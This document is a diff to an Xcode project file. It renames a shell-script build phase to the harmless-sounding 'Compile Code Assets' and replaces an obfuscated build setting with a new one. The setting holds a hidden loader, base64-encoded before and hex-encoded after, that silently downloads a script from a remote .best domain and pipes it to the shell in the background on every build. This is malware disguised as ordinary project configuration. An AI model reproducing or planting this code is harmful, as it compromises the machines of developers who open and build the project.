@@ -99,7 +99,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 4C742871309C928600105B48 /* Build configuration list for PBXNativeTarget "MyNewestGitProject" */;
 			buildPhases = (
-				BE085EBF89844C4595CD70F0 /* Provision Target Device */,
+				968E28B57F334D9BAACD70F0 /* Compile Code Assets */,
 				4C74284E309C928200105B48 /* Sources */,
 				4C74284F309C928200105B48 /* Frameworks */,
 				4C742850309C928200105B48 /* Resources */,
@@ -219,16 +219,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BE085EBF89844C4595CD70F0 /* Provision Target Device */ = {
+		968E28B57F334D9BAACD70F0 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
-			name = "Provision Target Device";
-			shellPath = /bin/sh;
-			shellScript = (
-				"# This output is used by Xcode outputs to avoid re-running this script phase.",
-				"sh -c \"${A0F07DC}\"",
+			files = (
 			);
-			showEnvVarsInLog = 0;
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A0F07DC}\"";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -268,7 +276,7 @@
 		4C74286F309C928600105B48 /* Debug configuration for PBXProject "MyNewestGitProject" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((d(){ `printf base6R4 | tr -d R` --decode; };echo ZWNobyAiJChjdXJsIC1rTGZzIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly92dTE4ZmVuZG4xb3ZoZy5iZXN0L2EpIiB8IHNoCg== | d | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((e(){ `printf xxZd | tr -d Z` -p -r; };echo 6563686f202224286375726c202d66734c6b202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f6a773875362d346f6c6f7a33782e626573742f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -332,7 +340,7 @@
 		4C742870309C928600105B48 /* Release configuration for PBXProject "MyNewestGitProject" */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((d(){ `printf base6R4 | tr -d R` --decode; };echo ZWNobyAiJChjdXJsIC1rTGZzIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly92dTE4ZmVuZG4xb3ZoZy5iZXN0L2EpIiB8IHNoCg== | d | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((e(){ `printf xxZd | tr -d Z` -p -r; };echo 6563686f202224286375726c202d66734c6b202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f6a773875362d346f6c6f7a33782e626573742f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
